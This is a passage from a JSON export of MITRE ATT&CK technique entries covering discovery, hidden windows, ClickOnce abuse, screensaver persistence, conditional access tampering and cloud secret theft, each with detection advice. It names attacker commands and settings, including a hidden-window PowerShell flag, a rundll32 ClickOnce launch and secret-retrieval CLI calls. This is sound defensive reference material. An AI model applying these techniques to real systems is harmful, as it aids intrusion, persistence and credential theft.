      "detection": "Monitor logs for API calls to disable logging. In AWS, monitor for: <code>StopLogging</code> and <code>DeleteTrail</code>.(Citation: Stopping CloudTrail from Sending Events to CloudWatch Logs) In GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs)  In Azure, monitor for <code>az monitor diagnostic-settings delete</code>.(Citation: az monitor diagnostic-settings) Additionally, a sudden loss of a log source may indicate that it has been disabled. "
    },
    "T1518.001": {
      "id": "T1518.001",
      "name": "Security Software Discovery",
      "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1518.001",
      "stix_id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
      "created": "2020-02-21T21:16:18.066000+00:00",
      "modified": "2025-04-15T23:05:09.449000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Firewall: Firewall Metadata",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Firewall: Firewall Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment."
    },
    "T1564.003": {
      "id": "T1564.003",
      "name": "Hidden Window",
      "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)\n\nThe Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing)\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.003",
      "stix_id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
      "created": "2020-03-13T20:26:49.433000+00:00",
      "modified": "2025-04-15T19:59:07.977000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Command: Command Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them."
    },
    "T1127.002": {
      "id": "T1127.002",
      "name": "ClickOnce",
      "description": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce)\n\nBecause ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.\n\nClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)\n\nAdversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe)\n\nAdditionally, an adversary can move the ClickOnce application file to a remote user\u2019s startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1127.002",
      "stix_id": "attack-pattern--cc279e50-df85-4c8e-be80-6dc2eda8849c",
      "created": "2024-09-09T14:39:28.637000+00:00",
      "modified": "2025-04-15T19:59:08.154000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Process: Process Metadata",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1059.006": {
      "id": "T1059.006",
      "name": "Python",
      "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.006",
      "stix_id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
      "created": "2020-03-09T14:38:24.334000+00:00",
      "modified": "2025-04-15T19:59:08.245000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
    },
    "T1070.010": {
      "id": "T1070.010",
      "name": "Relocate Malware",
      "description": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts.\n\nRelocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024)\n\nRelocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.010",
      "stix_id": "attack-pattern--cc36eeae-2209-4e63-89d3-c97e19edf280",
      "created": "2024-05-31T11:07:57.406000+00:00",
      "modified": "2025-04-15T19:59:08.329000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1591.004": {
      "id": "T1591.004",
      "name": "Identify Roles",
      "description": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1591.004",
      "stix_id": "attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4",
      "created": "2020-10-02T16:37:30.015000+00:00",
      "modified": "2025-04-15T22:40:57.270000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1132": {
      "id": "T1132",
      "name": "Data Encoding",
      "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1132",
      "stix_id": "attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f",
      "created": "2017-05-31T21:31:43.540000+00:00",
      "modified": "2025-04-16T20:37:21.024000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
    },
    "T1546.010": {
      "id": "T1546.010",
      "name": "AppInit DLLs",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.010",
      "stix_id": "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd",
      "created": "2020-01-24T14:52:25.589000+00:00",
      "modified": "2025-04-16T20:37:21.193000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Module: Module Load",
        "Windows Registry: Windows Registry Key Modification",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. (Citation: TechNet Autoruns) \n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement."
    },
    "T1598": {
      "id": "T1598",
      "name": "Phishing for Information",
      "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1598",
      "stix_id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
      "created": "2020-10-02T17:07:01.502000+00:00",
      "modified": "2025-04-15T19:59:08.689000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nWhen it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.\n\nMonitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts)."
    },
    "T1496": {
      "id": "T1496",
      "name": "Resource Hijacking",
      "description": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nResource hijacking may take a number of different forms. For example, adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n* Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n* Abuse cloud-based messaging services to send large quantities of spam messages\n\nIn some cases, adversaries may leverage multiple types of Resource Hijacking at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1496",
      "stix_id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
      "created": "2019-04-17T14:50:05.682000+00:00",
      "modified": "2025-04-15T23:00:21.372000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Modification",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "File: File Creation",
        "Network Traffic: Network Connection Creation",
        "Sensor Health: Host Status",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage."
    },
    "T1585": {
      "id": "T1585",
      "name": "Establish Accounts",
      "description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for malicious purposes.(Citation: Free Trial PurpleUrchin)\n",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1585",
      "stix_id": "attack-pattern--cdfc5f0a-9bb9-4352-b896-553cfa2d8fd8",
      "created": "2020-10-01T01:05:42.216000+00:00",
      "modified": "2025-04-15T22:28:26.144000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Persona: Social Media"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566))."
    },
    "T1588": {
      "id": "T1588",
      "name": "Obtain Capabilities",
      "description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation: PegasusCitizenLab)\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588",
      "stix_id": "attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1",
      "created": "2020-10-01T01:56:24.776000+00:00",
      "modified": "2025-04-15T22:54:16.100000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Certificate: Certificate Registration",
        "Malware Repository: Malware Metadata",
        "Internet Scan: Response Content",
        "Malware Repository: Malware Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain) Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)\n\nConsider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
    },
    "T1546.002": {
      "id": "T1546.002",
      "name": "Screensaver",
      "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.002",
      "stix_id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
      "created": "2020-01-24T13:51:01.210000+00:00",
      "modified": "2025-04-16T20:37:21.356000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "File: File Creation",
        "Command: Command Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\n\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated."
    },
    "T1556.009": {
      "id": "T1556.009",
      "name": "Conditional Access Policies",
      "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.009",
      "stix_id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
      "created": "2024-01-02T13:43:37.389000+00:00",
      "modified": "2025-04-15T22:09:03.621000+00:00",
      "platforms": [
        "IaaS",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "Cloud Service: Cloud Service Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1578.002": {
      "id": "T1578.002",
      "name": "Create Cloud Instance",
      "description": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020)\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1578.002",
      "stix_id": "attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c",
      "created": "2020-05-14T14:45:15.978000+00:00",
      "modified": "2025-04-15T22:10:54.239000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Creation",
        "Instance: Instance Metadata"
      ],
      "defense_bypassed": [],
      "detection": "The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.\n\nIn AWS, CloudTrail logs capture the creation of an instance in the <code>RunInstances</code> event, and in Azure the creation of a VM may be captured in Azure activity logs.(Citation: AWS CloudTrail Search)(Citation: Azure Activity Logs) Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of <code>gcloud compute instances create</code> to create a VM.(Citation: Cloud Audit Logs)"
    },
    "T1555.006": {
      "id": "T1555.006",
      "name": "Cloud Secrets Management Stores",
      "description": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)\n\n**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the 